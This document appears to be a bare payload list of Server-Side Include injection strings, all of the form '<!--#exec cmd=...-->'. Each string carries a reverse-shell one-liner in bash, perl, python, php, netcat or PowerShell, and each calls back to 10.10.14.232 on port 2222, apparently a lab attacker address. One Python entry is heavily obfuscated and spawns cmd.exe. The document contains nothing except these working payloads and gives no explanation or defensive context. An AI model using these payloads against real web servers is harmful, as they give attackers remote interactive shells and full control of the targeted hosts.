<!--#exec cmd="bash -i >& /dev/tcp/10.10.14.232/2222 0>&1" -->
<!--#exec cmd="0<&196;exec 196<>/dev/tcp/10.10.14.232/2222; sh <&196 >&196 2>&196" -->
<!--#exec cmd="/bin/bash -l > /dev/tcp/10.10.14.232/2222 0<&1 2>&1" -->
<!--#exec cmd="sh -i >& /dev/udp/10.10.14.232/2222 0>&1" -->
<!--#exec cmd="perl -e 'use Socket;$i="10.10.14.232";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'" -->
<!--#exec cmd="perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.14.232:2222");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'" -->
<!--#exec cmd="python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.232",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'" -->
<!--#exec cmd="python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.232",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'" -->
<!--#exec cmd="python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.10.14.232",2222));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'" -->
<!--#exec cmd="python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.10.14.232', 2222)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"" -->
<!--#exec cmd="php -r '$sock=fsockopen("10.10.14.232",2222);exec("/bin/sh -i <&3 >&3 2>&3");'" -->
<!--#exec cmd="php -r '$sock=fsockopen("10.10.14.232",2222);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'" -->
<!--#exec cmd="nc -e /bin/sh 10.10.14.232 2222" -->
<!--#exec cmd="nc -e /bin/bash 10.10.14.232 2222" -->
<!--#exec cmd="nc -c bash 10.10.14.232 2222" -->
<!--#exec cmd="ncat 10.10.14.232 2222 -e /bin/bash" -->
<!--#exec cmd="ncat --udp 10.10.14.232 2222 -e /bin/bash" -->
<!--#exec cmd="powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.232',2222);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"" -->